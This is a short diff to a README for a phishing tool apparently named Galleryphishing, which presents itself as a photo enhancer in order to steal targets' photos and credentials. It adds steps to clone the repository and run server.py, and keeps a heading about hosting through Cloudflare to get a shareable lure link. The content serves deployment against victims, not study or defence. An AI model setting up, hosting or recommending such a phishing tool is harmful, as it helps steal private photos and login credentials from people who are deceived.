@@ -3,7 +3,18 @@
 
 A photo enhancer interface to steal photos of targets , credentials will provided in folder name stolen data 
 
-# Host with cloudflair to get sharable link
+## Installation
+```bash
+git clone https://github.com/toolsbyvipin/Galleryphishing.git
+```
+```bash
+# 2. Make executable
+chmod +x server.py
+
+# 3. Run server
+python3 server.py
+```
+## Host with cloudflair to get sharable link
 
 
 ```bash
